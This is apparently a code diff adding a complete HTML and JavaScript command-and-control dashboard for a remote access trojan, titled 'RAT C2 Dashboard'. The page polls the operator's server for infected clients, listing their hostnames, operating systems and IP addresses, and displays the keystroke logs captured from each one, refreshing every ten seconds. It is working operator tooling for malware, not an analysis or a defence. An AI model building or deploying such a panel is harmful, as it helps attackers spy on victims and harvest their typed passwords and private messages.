@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT C2 Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card h2 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+        
+        .stat {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .stat:last-child {
+            border-bottom: none;
+        }
+        
+        .stat-label {
+            font-weight: 600;
+            color: #555;
+        }
+        
+        .stat-value {
+            color: #667eea;
+            font-weight: bold;
+        }
+        
+        .status-online {
+            color: #10b981;
+        }
+        
+        .status-offline {
+            color: #ef4444;
+        }
+        
+        .clients-list {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        
+        th {
+            background: #667eea;
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        tr:hover {
+            background: #f9fafb;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 8px 16px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 0.9em;
+            transition: background 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            background: #5568d3;
+        }
+        
+        .refresh-btn {
+            background: #10b981;
+        }
+        
+        .refresh-btn:hover {
+            background: #059669;
+        }
+        
+        .keylog-box {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-top: 20px;
+        }
+        
+        .keylog-entry {
+            background: #f9fafb;
+            padding: 10px;
+            margin: 8px 0;
+            border-left: 4px solid #667eea;
+            border-radius: 5px;
+        }
+        
+        .keylog-time {
+            color: #6b7280;
+            font-size: 0.85em;
+            margin-bottom: 5px;
+        }
+        
+        .keylog-text {
+            font-family: 'Courier New', monospace;
+            color: #1f2937;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #667eea;
+        }
+        
+        .error {
+            background: #fee2e2;
+            color: #991b1b;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        
+        .success {
+            background: #d1fae5;
+            color: #065f46;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 RAT C2 Dashboard</h1>
+        
+        <div class="dashboard">
+            <div class="card">
+                <h2>📊 Server Status</h2>
+                <div id="serverStatus" class="loading">Loading...</div>
+            </div>
+            
+            <div class="card">
+                <h2>💻 Connected Clients</h2>
+                <div id="clientsCount" class="loading">Loading...</div>
+            </div>
+            
+            <div class="card">
+                <h2>⌨️ Keylogs Stats</h2>
+                <div id="keylogsStats" class="loading">Loading...</div>
+            </div>
+        </div>
+        
+        <div class="clients-list">
+            <h2>🌐 Active Clients</h2>
+            <button class="btn refresh-btn" onclick="loadAllData()">🔄 Refresh</button>
+            <div id="clientsTable"></div>
+        </div>
+        
+        <div id="keylogsSection" class="keylog-box" style="display:none;">
+            <h2>⌨️ Keylogs</h2>
+            <select id="clientSelect" onchange="loadKeylogs()">
+                <option value="">Select a client...</option>
+            </select>
+            <div id="keylogsDisplay"></div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+        
+        async function fetchJSON(url) {
+            try {
+                const response = await fetch(url);
+                return await response.json();
+            } catch (error) {
+                console.error('Fetch error:', error);
+                return null;
+            }
+        }
+        
+        async function loadServerStatus() {
+            const data = await fetchJSON(`${API_BASE}/admin/status`);
+            const statusDiv = document.getElementById('serverStatus');
+            
+            if (data) {
+                statusDiv.innerHTML = `
+                    <div class="stat">
+                        <span class="stat-label">Status:</span>
+                        <span class="stat-value status-online">🟢 ${data.status}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Total Clients:</span>
+                        <span class="stat-value">${data.total_clients}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Online:</span>
+                        <span class="stat-value status-online">${data.online_clients}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Uptime:</span>
+                        <span class="stat-value">${formatUptime(data.uptime_seconds)}</span>
+                    </div>
+                `;
+            } else {
+                statusDiv.innerHTML = '<div class="error">Failed to load server status</div>';
+            }
+        }
+        
+        async function loadClients() {
+            const data = await fetchJSON(`${API_BASE}/admin/clients`);
+            const countDiv = document.getElementById('clientsCount');
+            const tableDiv = document.getElementById('clientsTable');
+            const selectDiv = document.getElementById('clientSelect');
+            
+            if (data && data.clients) {
+                const clients = data.clients;
+                const onlineClients = clients.filter(c => c.online).length;
+                
+                countDiv.innerHTML = `
+                    <div class="stat">
+                        <span class="stat-label">Total:</span>
+                        <span class="stat-value">${clients.length}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Online:</span>
+                        <span class="stat-value status-online">${onlineClients}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Offline:</span>
+                        <span class="stat-value status-offline">${clients.length - onlineClients}</span>
+                    </div>
+                `;
+                
+                if (clients.length > 0) {
+                    let tableHTML = `
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Status</th>
+                                    <th>Client ID</th>
+                                    <th>Hostname</th>
+                                    <th>OS</th>
+                                    <th>IP</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                    `;
+                    
+                    selectDiv.innerHTML = '<option value="">Select a client...</option>';
+                    
+                    clients.forEach(client => {
+                        const status = client.online ? '🟢' : '🔴';
+                        const hostname = client.system_info?.hostname || 'Unknown';
+                        const platform = client.system_info?.platform || 'Unknown';
+                        
+                        tableHTML += `
+                            <tr>
+                                <td>${status}</td>
+                                <td><code>${client.client_id.substring(0, 12)}...</code></td>
+                                <td>${hostname}</td>
+                                <td>${platform}</td>
+                                <td>${client.ip || 'N/A'}</td>
+                                <td>
+                                    <button class="btn" onclick="viewKeylogs('${client.client_id}')">View Keylogs</button>
+                                </td>
+                            </tr>
+                        `;
+                        
+                        selectDiv.innerHTML += `<option value="${client.client_id}">${hostname} (${client.client_id.substring(0, 8)}...)</option>`;
+                    });
+                    
+                    tableHTML += '</tbody></table>';
+                    tableDiv.innerHTML = tableHTML;
+                    
+                    document.getElementById('keylogsSection').style.display = 'block';
+                } else {
+                    tableDiv.innerHTML = '<div class="error">No clients connected yet</div>';
+                }
+            } else {
+                countDiv.innerHTML = '<div class="error">Failed to load clients</div>';
+                tableDiv.innerHTML = '<div class="error">Failed to load clients</div>';
+            }
+        }
+        
+        async function loadKeylogsStats() {
+            const data = await fetchJSON(`${API_BASE}/admin/keylogs_stats`);
+            const statsDiv = document.getElementById('keylogsStats');
+            
+            if (data) {
+                statsDiv.innerHTML = `
+                    <div class="stat">
+                        <span class="stat-label">Clients with logs:</span>
+                        <span class="stat-value">${data.clients_with_logs}</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Total entries:</span>
+                        <span class="stat-value">${data.total_keylogs}</span>
+                    </div>
+                `;
+            } else {
+                statsDiv.innerHTML = '<div class="error">Failed to load stats</div>';
+            }
+        }
+        
+        async function viewKeylogs(clientId) {
+            document.getElementById('clientSelect').value = clientId;
+            await loadKeylogs();
+            document.getElementById('keylogsSection').scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        async function loadKeylogs() {
+            const clientId = document.getElementById('clientSelect').value;
+            const displayDiv = document.getElementById('keylogsDisplay');
+            
+            if (!clientId) {
+                displayDiv.innerHTML = '';
+                return;
+            }
+            
+            displayDiv.innerHTML = '<div class="loading">Loading keylogs...</div>';
+            
+            const data = await fetchJSON(`${API_BASE}/admin/keylogs/${clientId}`);
+            
+            if (data && data.success) {
+                if (data.keylogs && data.keylogs.length > 0) {
+                    let html = `<div class="success">Found ${data.total_logs} keylogs (showing last ${data.returned_logs})</div>`;
+                    
+                    data.keylogs.reverse().forEach(log => {
+                        html += `
+                            <div class="keylog-entry">
+                                <div class="keylog-time">🕐 ${new Date(log.timestamp).toLocaleString()}</div>
+                                <div class="keylog-text">${escapeHtml(log.text)}</div>
+                            </div>
+                        `;
+                    });
+                    
+                    displayDiv.innerHTML = html;
+                } else {
+                    displayDiv.innerHTML = '<div class="error">No keylogs found for this client. Make sure the keylogger is started.</div>';
+                }
+            } else {
+                displayDiv.innerHTML = '<div class="error">Failed to load keylogs</div>';
+            }
+        }
+        
+        function formatUptime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            return `${hours}h ${minutes}m`;
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        async function loadAllData() {
+            await Promise.all([
+                loadServerStatus(),
+                loadClients(),
+                loadKeylogsStats()
+            ]);
+        }
+        
+        // Initial load
+        loadAllData();
+        
+        // Auto-refresh every 10 seconds
+        setInterval(loadAllData, 10000);
+    </script>
+</body>
+</html>
